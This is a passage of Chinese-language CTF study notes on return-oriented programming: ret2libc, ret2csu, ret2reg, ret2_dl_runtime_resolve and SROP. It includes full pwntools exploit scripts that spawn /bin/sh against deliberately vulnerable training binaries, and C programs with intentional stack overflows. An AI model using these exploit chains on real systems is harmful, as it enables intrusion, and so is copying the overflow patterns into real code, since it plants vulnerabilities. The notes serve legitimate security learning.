gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])</div><div class="line">sh.sendline(payload)</div><div class="line">sh.sendline(&apos;/bin/sh&apos;)</div><div class="line">sh.interactive()</div></pre></td></tr></table></figure></p>
+<p>第二个-无system无sh字串<br><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3" target="_blank" rel="external">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3</a><br>这是由于目标程序没有使用libc的system，需要自己定位位置<br>首先泄露libc中某个函数的地址，由于延迟绑定，需要泄露已经执行过的函数。因为got表中存的是引用其他模块符号的地址，而got表是属于此模块的，因此可以通过固定的地址找到。之后根据泄露的地址确定libc版本与基地址，找到system与sh地址，返回到main再次执行程序不重启，执行system。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">from LibcSearcher import LibcSearcher</div><div class="line">sh = process(&apos;./ret2libc3&apos;)</div><div class="line"></div><div class="line">ret2libc3 = ELF(&apos;./ret2libc3&apos;)</div><div class="line"></div><div class="line">puts_plt = ret2libc3.plt[&apos;puts&apos;]</div><div class="line">libc_start_main_got = ret2libc3.got[&apos;__libc_start_main&apos;]</div><div class="line">main = ret2libc3.symbols[&apos;main&apos;]</div><div class="line"></div><div class="line">print &quot;leak libc_start_main_got addr and return to main again&quot;</div><div class="line">payload = flat([&apos;A&apos; * 112, puts_plt, main, libc_start_main_got])</div><div class="line">sh.sendlineafter(&apos;Can you find it !?&apos;, payload)</div><div class="line"></div><div class="line">print &quot;get the related addr&quot;</div><div class="line">libc_start_main_addr = u32(sh.recv()[0:4])</div><div class="line">libc = LibcSearcher(&apos;__libc_start_main&apos;, libc_start_main_addr)</div><div class="line">libcbase = libc_start_main_addr - libc.dump(&apos;__libc_start_main&apos;)</div><div class="line">system_addr = libcbase + libc.dump(&apos;system&apos;)</div><div class="line">binsh_addr = libcbase + libc.dump(&apos;str_bin_sh&apos;)</div><div class="line"></div><div class="line">print &quot;get shell&quot;</div><div class="line">payload = flat([&apos;A&apos; * 104, system_addr, 0xdeadbeef, binsh_addr])</div><div class="line">sh.sendline(payload)</div><div class="line"></div><div class="line">sh.interactive()</div></pre></td></tr></table></figure></p>
+<p>注意这集个libc程序ida都没有分析准确变量的偏移，因为变量是用esp计算的。且esp前后与FFF0h变化不同(为了访问速度对齐用的)，因此第一次变量距离ebp为108，第二次为100。<br>LibcSearcher会提示多个库可选。</p>
+<h3 id="中级ROP"><a href="#中级ROP" class="headerlink" title="中级ROP"></a>中级ROP</h3><p>利用些巧妙的Gadgets</p>
+<h4 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h4><p>一个x64程序只开NX<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">#undef _FORTIFY_SOURCE</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">void vulnerable_function() &#123;</div><div class="line">	char buf[128];</div><div class="line">	read(STDIN_FILENO, buf, 512);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char** argv) &#123;</div><div class="line">	write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);</div><div class="line">	vulnerable_function();</div><div class="line">&#125;</div><div class="line"></div><div class="line">.text:0000000000400573                 mov     edx, 0Dh        ; n</div><div class="line">.text:0000000000400578                 mov     esi, offset aHelloWorld ; &quot;Hello, World\n&quot;</div><div class="line">.text:000000000040057D                 mov     edi, 1          ; fd</div><div class="line">.text:0000000000400582                 call    _write</div></pre></td></tr></table></figure></p>
+<p>利用的是编译器添加的libc初始化函数libc_csu_init<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">.text:00000000004005C0 ; void _libc_csu_init(void)</div><div class="line">....</div><div class="line">.text:0000000000400600</div><div class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</div><div class="line">.text:0000000000400600                 mov     rdx, r13</div><div class="line">.text:0000000000400603                 mov     rsi, r14</div><div class="line">.text:0000000000400606                 mov     edi, r15d</div><div class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</div><div class="line">.text:000000000040060D                 add     rbx, 1</div><div class="line">.text:0000000000400611                 cmp     rbx, rbp</div><div class="line">.text:0000000000400614                 jnz     short loc_400600</div><div class="line">.text:0000000000400616</div><div class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</div><div class="line">.text:0000000000400616                 add     rsp, 8</div><div class="line">.text:000000000040061A                 pop     rbx</div><div class="line">.text:000000000040061B                 pop     rbp</div><div class="line">.text:000000000040061C                 pop     r12</div><div class="line">.text:000000000040061E                 pop     r13</div><div class="line">.text:0000000000400620                 pop     r14</div><div class="line">.text:0000000000400622                 pop     r15</div><div class="line">.text:0000000000400624                 retn</div><div class="line">.text:0000000000400624 __libc_csu_init endp</div></pre></td></tr></table></figure></p>
+<p>0x000000000040061A 可以用来控制rbx,rbp,r12,r13,r14,r15<br>0x0000000000400600 到 0x0000000000400609，通过r13、r14、r15d控制rdx、rsi、edi，控制r12 与 rbx可调用某地址的函数。<br>0x000000000040060D 控制 rbx+1 = rbp即可不跳转，继续执行返回。</p>
+<p>exp:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">from LibcSearcher import LibcSearcher</div><div class="line"></div><div class="line">#context.log_level = &apos;debug&apos;</div><div class="line"></div><div class="line">level5 = ELF(&apos;./level5&apos;)</div><div class="line">sh = process(&apos;./level5&apos;)</div><div class="line"></div><div class="line">write_got = level5.got[&apos;write&apos;]</div><div class="line">read_got = level5.got[&apos;read&apos;]</div><div class="line">main_addr = level5.symbols[&apos;main&apos;]</div><div class="line">bss_base = level5.bss()</div><div class="line">csu_front_addr = 0x0000000000400600</div><div class="line">csu_end_addr = 0x000000000040061A</div><div class="line">fakeebp = &apos;b&apos; * 8</div><div class="line"></div><div class="line"></div><div class="line">def csu(rbx, rbp, r12, r13, r14, r15, last):</div><div class="line">    # pop rbx,rbp,r12,r13,r14,r15</div><div class="line">    # rbx should be 0,</div><div class="line">    # rbp should be 1,enable not to jump</div><div class="line">    # r12 should be the function we want to call</div><div class="line">    # rdi=edi=r15d</div><div class="line">    # rsi=r14</div><div class="line">    # rdx=r13</div><div class="line">    payload = &apos;a&apos; * 0x80 + fakeebp</div><div class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</div><div class="line">        r13) + p64(r14) + p64(r15)</div><div class="line">    payload += p64(csu_front_addr)</div><div class="line">    payload += &apos;a&apos; * 0x38</div><div class="line">    payload += p64(last)</div><div class="line">    sh.send(payload)</div><div class="line">    sleep(1)</div><div class="line"></div><div class="line"></div><div class="line">sh.recvuntil(&apos;Hello, World\n&apos;)</div><div class="line">## RDI, RSI, RDX, RCX, R8, R9, more on the stack</div><div class="line">## write(1,write_got,8)</div><div class="line"># bx=0可跳转到r12、rbp=1控制向下执行，r12为存有要跳转函数的地址，之后为三个将被转移给rdx、rsi、edi的参数。这里是为了执行write，最后为最后跳转地址。</div><div class="line">csu(0, 1, write_got, 8, write_got, 1, main_addr)</div><div class="line"># 获取泄露地址，计算execve的地址--这里不是用系统调用而是是用库的壳函数</div><div class="line">write_addr = u64(sh.recv(8))</div><div class="line">libc = LibcSearcher(&apos;write&apos;, write_addr)</div><div class="line">libc_base = write_addr - libc.dump(&apos;write&apos;)</div><div class="line">execve_addr = libc_base + libc.dump(&apos;execve&apos;)</div><div class="line">log.success(&apos;execve_addr &apos; + hex(execve_addr))</div><div class="line">##gdb.attach(sh)</div><div class="line"></div><div class="line">## read(0,bss_base,16)</div><div class="line">## read execve_addr and /bin/sh\x00</div><div class="line"># 写execve的地址与字串</div><div class="line">sh.recvuntil(&apos;Hello, World\n&apos;)</div><div class="line">csu(0, 1, read_got, 16, bss_base, 0, main_addr)</div><div class="line">sh.send(p64(execve_addr) + &apos;/bin/sh\x00&apos;)</div><div class="line"></div><div class="line"># 调用execve，并传入字串</div><div class="line">sh.recvuntil(&apos;Hello, World\n&apos;)</div><div class="line">## execve(bss_base+8)</div><div class="line">csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)</div><div class="line">sh.interactive()</div></pre></td></tr></table></figure></p>
+<p>因此可以利用一些类似的gcc编译进去的函数:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">_init</div><div class="line">_start</div><div class="line">call_gmon_start</div><div class="line">deregister_tm_clones</div><div class="line">register_tm_clones</div><div class="line">__do_global_dtors_aux</div><div class="line">frame_dummy</div><div class="line">__libc_csu_init</div><div class="line">__libc_csu_fini</div><div class="line">_fini</div></pre></td></tr></table></figure></p>
+<p>PC将地址处的数据给cpu，cpu解码成功就可以执行，因此可以将一些地址偏移从而执行想要的指令。—很好的思路！<br>例如刚才的0x000000000040061A<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">gef➤  x/5i 0x000000000040061A</div><div class="line">   0x40061a &lt;__libc_csu_init+90&gt;:   pop    rbx</div><div class="line">   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp</div><div class="line">   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12</div><div class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</div><div class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</div><div class="line">gef➤  x/5i 0x000000000040061b</div><div class="line">   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp</div><div class="line">   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12</div><div class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</div><div class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</div><div class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</div><div class="line">gef➤  x/5i 0x000000000040061A+3</div><div class="line">   0x40061d &lt;__libc_csu_init+93&gt;:   pop    rsp</div><div class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</div><div class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</div><div class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</div><div class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</div><div class="line">gef➤  x/5i 0x000000000040061e</div><div class="line">   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</div><div class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</div><div class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</div><div class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</div><div class="line">   0x400625:    nop</div><div class="line">gef➤  x/5i 0x000000000040061f</div><div class="line">   0x40061f &lt;__libc_csu_init+95&gt;:   pop    rbp</div><div class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</div><div class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</div><div class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</div><div class="line">   0x400625:    nop</div><div class="line">gef➤  x/5i 0x0000000000400620</div><div class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</div><div class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</div><div class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</div><div class="line">   0x400625:    nop</div><div class="line">   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]</div><div class="line">gef➤  x/5i 0x0000000000400621</div><div class="line">   0x400621 &lt;__libc_csu_init+97&gt;:   pop    rsi</div><div class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</div><div class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</div><div class="line">   0x400625:    nop</div><div class="line">gef➤  x/5i 0x000000000040061A+9</div><div class="line">   0x400623 &lt;__libc_csu_init+99&gt;:   pop    rdi</div><div class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</div><div class="line">   0x400625:    nop</div><div class="line">   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]</div><div class="line">   0x400630 &lt;__libc_csu_fini&gt;:  repz ret</div></pre></td></tr></table></figure></p>
+<h4 id="ret2reg"><a href="#ret2reg" class="headerlink" title="ret2reg"></a>ret2reg</h4><p>当数据地址可执行时。<br>溢出返回时某寄存器指向溢出地址，查找 call reg 或者 jmp reg 指令，将 EIP 设置为该指令地址，从而执行shellcode</p>
+<h4 id="BROP"><a href="#BROP" class="headerlink" title="BROP"></a>BROP</h4><h3 id="高级ROP"><a href="#高级ROP" class="headerlink" title="高级ROP"></a>高级ROP</h3><h4 id="ret2-dl-runtime-resolve"><a href="#ret2-dl-runtime-resolve" class="headerlink" title="ret2_dl_runtime_resolve"></a>ret2_dl_runtime_resolve</h4><p>由于程序没有使用libc的sys，且无法定位libc的位置。<br>got的内容:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">前三项</div><div class="line">.dynamic 段的地址</div><div class="line">本模块的 ID</div><div class="line">_dl_runtime_resolve()的地址</div><div class="line">外部地址</div></pre></td></tr></table></figure></p>
+<p>plt的实现:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">PLT0:</div><div class="line">push *(GOT + 4) //压入模块id</div><div class="line">jmp *(GOT + 8)  //跳转到 _dl_runtime_resolve()函数</div><div class="line">...</div><div class="line">bar@plt:</div><div class="line">jmp *(bar@GOT)   //仍然首先进行GOT跳转，尝试是否是第一次链接</div><div class="line">push n		     //压入需要地址绑定的符号在重定位表中的下标</div><div class="line">jmp PLT0	        //跳转到 PLT0</div></pre></td></tr></table></figure></p>
+<p>_dl_runtime_resolve解析过程-根据该模块的重定位表对应项，找到符号表对应项，从而找到符号名字与位置。在已加载的符号表中搜索，进行重定位。<br>要求不会检查符号是否越界，解析依赖于给定的字串。</p>
+<p>正常攻击:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">void vuln()</div><div class="line">&#123;</div><div class="line">    char buf[100];</div><div class="line">    setbuf(stdin, buf);</div><div class="line">    read(0, buf, 256);</div><div class="line">&#125;</div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">    char buf[100] = &quot;Welcome to XDCTF2015~!\n&quot;;</div><div class="line"></div><div class="line">    setbuf(stdout, buf);</div><div class="line">    write(1, buf, strlen(buf));</div><div class="line">    vuln();</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>无Canary保护</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">elf = ELF(&apos;main&apos;)</div><div class="line">r = process(&apos;./main&apos;)</div><div class="line">rop = ROP(&apos;./main&apos;)</div><div class="line"></div><div class="line">offset = 112</div><div class="line">bss_addr = elf.bss()</div><div class="line"></div><div class="line">r.recvuntil(&apos;Welcome to XDCTF2015~!\n&apos;)</div><div class="line"></div><div class="line">## stack pivoting to bss segment</div><div class="line">## new stack size is 0x800</div><div class="line">## 转移栈到bss，并向栈底继续写数据</div><div class="line">stack_size = 0x800</div><div class="line">base_stage = bss_addr + stack_size</div><div class="line">### padding</div><div class="line">rop.raw(&apos;a&apos; * offset)</div><div class="line">### read 100 byte to base_stage</div><div class="line">rop.read(0, base_stage, 100)</div><div class="line">### stack pivoting, set esp = base_stage</div><div class="line">rop.migrate(base_stage)</div><div class="line">r.sendline(rop.chain())</div><div class="line"></div><div class="line">## write sh=&quot;/bin/sh&quot;</div><div class="line">rop = ROP(&apos;./main&apos;)</div><div class="line">sh = &quot;/bin/sh&quot;</div><div class="line"></div><div class="line">plt0 = elf.get_section_by_name(&apos;.plt&apos;).header.sh_addr</div><div class="line">rel_plt = elf.get_section_by_name(&apos;.rel.plt&apos;).header.sh_addr</div><div class="line">dynsym = elf.get_section_by_name(&apos;.dynsym&apos;).header.sh_addr</div><div class="line">dynstr = elf.get_section_by_name(&apos;.dynstr&apos;).header.sh_addr</div><div class="line"></div><div class="line">### making fake write symbol</div><div class="line">fake_sym_addr = base_stage + 32</div><div class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf</div><div class="line">                )  # since the size of item(Elf32_Symbol) of dynsym is 0x10</div><div class="line">fake_sym_addr = fake_sym_addr + align</div><div class="line">index_dynsym = (</div><div class="line">    fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write</div><div class="line">## plus 10 since the size of Elf32_Sym is 16.</div><div class="line">st_name = fake_sym_addr + 0x10 - dynstr</div><div class="line">fake_write_sym = flat([st_name, 0, 0, 0x12])</div><div class="line"></div><div class="line">### making fake write relocation</div><div class="line"></div><div class="line">## making base_stage+24 ---&gt; fake reloc</div><div class="line">index_offset = base_stage + 24 - rel_plt</div><div class="line">write_got = elf.got[&apos;write&apos;]</div><div class="line">r_info = (index_dynsym &lt;&lt; 8) | 0x7</div><div class="line">fake_write_reloc = flat([write_got, r_info])</div><div class="line"></div><div class="line">rop.raw(plt0)</div><div class="line">rop.raw(index_offset)</div><div class="line">## fake ret addr of write</div><div class="line">rop.raw(&apos;bbbb&apos;)</div><div class="line">rop.raw(base_stage + 82)</div><div class="line">rop.raw(&apos;bbbb&apos;)</div><div class="line">rop.raw(&apos;bbbb&apos;)</div><div class="line">rop.raw(fake_write_reloc)  # fake write reloc</div><div class="line">rop.raw(&apos;a&apos; * align)  # padding</div><div class="line">rop.raw(fake_write_sym)  # fake write symbol</div><div class="line">rop.raw(&apos;system\x00&apos;)  # there must be a \x00 to mark the end of string</div><div class="line">rop.raw(&apos;a&apos; * (80 - len(rop.chain())))</div><div class="line">print rop.dump()</div><div class="line">print len(rop.chain())</div><div class="line">rop.raw(sh + &apos;\x00&apos;)</div><div class="line">rop.raw(&apos;a&apos; * (100 - len(rop.chain())))</div><div class="line"></div><div class="line">r.sendline(rop.chain())</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
+<p>使用roputil:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">from roputils import *</div><div class="line">from pwn import process</div><div class="line">from pwn import gdb</div><div class="line">from pwn import context</div><div class="line">r = process(&apos;./main&apos;)</div><div class="line">context.log_level = &apos;debug&apos;</div><div class="line">r.recv()</div><div class="line"></div><div class="line">rop = ROP(&apos;./main&apos;)</div><div class="line">offset = 112</div><div class="line">bss_base = rop.section(&apos;.bss&apos;)</div><div class="line">buf = rop.fill(offset)</div><div class="line"># 自动寻找片段生成rop链。调用read写数据到bss_base</div><div class="line">buf += rop.call(&apos;read&apos;, 0, bss_base, 100)</div><div class="line">## used to call dl_Resolve()  call动态重定位的函数，分别是重定位表、参数</div><div class="line">buf += rop.dl_resolve_call(bss_base + 20, bss_base)</div><div class="line">r.send(buf)</div><div class="line"></div><div class="line">向可控的bss前100字节写入参数和仿造的dl_resolve重定位表</div><div class="line">buf = rop.string(&apos;/bin/sh&apos;)</div><div class="line">buf += rop.fill(20, buf)</div><div class="line">## used to make faking data, such relocation, Symbol, Str</div><div class="line">buf += rop.dl_resolve_data(bss_base + 20, &apos;system&apos;)</div><div class="line">buf += rop.fill(100, buf)</div><div class="line">r.send(buf)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
+<h4 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h4><p>信号是在软件层次上对中断机制的一种模拟。<br>执行流程:<br>内核发起signal、signal数据push到栈中、sigreturn syscall的位置 push 进栈、跳转至signal handler、转至 sigreturn code、stack 即栈上的内容全部 pop 回register ，流程又重新回到 user code<br>中间经过内核俩次，分别再执行handler前后。sigreturn为系统调用，作用是根据signal数据还原、返回其中指明的地址。</p>
+<p>攻击原理:<br>伪造sigcontext 结构，push进stack中<br>栈溢出设置ret address在sigreturn syscall的gadget<br>将signal fram中的rip(eip)设置在syscall（int 0x80)<br>当sigreturn返回时，就可以执行syscall</p>
+<p>这样做的好处是sigreturn利用栈中的数据将寄存器都设置成可控制的了，同时由于sp也可操控因此ip可以指向syscall;ret;之后在新栈中数据预先仍是sigcontext即可再执行一次上述行为。形成一条执行任意系统调用的链，并且参数全部可控。</p>
+<p>可直接使用pwntool工具:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">from LibcSearcher import *</div><div class="line">small = ELF(&apos;./smallest&apos;)</div><div class="line">if args[&apos;REMOTE&apos;]:</div><div class="line">    sh = remote(&apos;127.0.0.1&apos;, 7777)</div><div class="line">else:</div><div class="line">    sh = process(&apos;./smallest&apos;)</div><div class="line">context.arch = &apos;amd64&apos;</div><div class="line">context.log_level = &apos;debug&apos;</div><div class="line">syscall_ret = 0x00000000004000BE</div><div class="line">start_addr = 0x00000000004000B0</div><div class="line">## set start addr three times</div><div class="line">payload = p64(start_addr) * 3</div><div class="line">sh.send(payload)</div><div class="line"></div><div class="line">## modify the return addr to start_addr+3</div><div class="line">## so that skip the xor rax,rax; then the rax=1</div><div class="line">## get stack addr</div><div class="line">sh.send(&apos;\xb3&apos;)</div><div class="line">stack_addr = u64(sh.recv()[8:16])</div><div class="line">log.success(&apos;leak stack addr :&apos; + hex(stack_addr))</div><div class="line"></div><div class="line">## make the rsp point to stack_addr</div><div class="line">## the frame is read(0,stack_addr,0x400)</div><div class="line">sigframe = SigreturnFrame()</div><div class="line">sigframe.rax = constants.SYS_read</div><div class="line">sigframe.rdi = 0</div><div class="line">sigframe.rsi = stack_addr</div><div class="line">sigframe.rdx = 0x400</div><div class="line">sigframe.rsp = stack_addr</div><div class="line">sigframe.rip = syscall_ret</div><div class="line">payload = p64(start_addr) + &apos;a&apos; * 8 + str(sigframe)</div><div class="line">sh.send(payload)</div><div class="line"></div><div class="line">## set rax=15 and call sigreturn</div><div class="line">sigreturn = p64(syscall_ret) + &apos;b&apos; * 7</div><div class="line">sh.send(sigreturn)</div><div class="line"></div><div class="line">## call execv(&quot;/bin/sh&quot;,0,0)</div><div class="line">sigframe = SigreturnFrame()</div><div class="line">sigframe.rax = constants.SYS_execve</div><div class="line">sigframe.rdi = stack_addr + 0x120  # &quot;/bin/sh&quot; &apos;s addr</div><div class="line">sigframe.rsi = 0x0</div><div class="line">sigframe.rdx = 0x0</div><div class="line">sigframe.rsp = stack_addr</div><div class="line">sigframe.rip = syscall_ret</div><div class="line"></div><div class="line">frame_payload = p64(start_addr) + &apos;b&apos; * 8 + str(sigframe)</div><div class="line">print len(frame_payload)</div><div class="line">payload = frame_payload + (0x120 - len(frame_payload)) * &apos;\x00&apos; + &apos;/bin/sh\x00&apos;</div><div class="line">sh.send(payload)</div><div class="line">sh.send(sigreturn)</div><div class="line">sh.interactive()</div></pre></td></tr></table></figure></p>
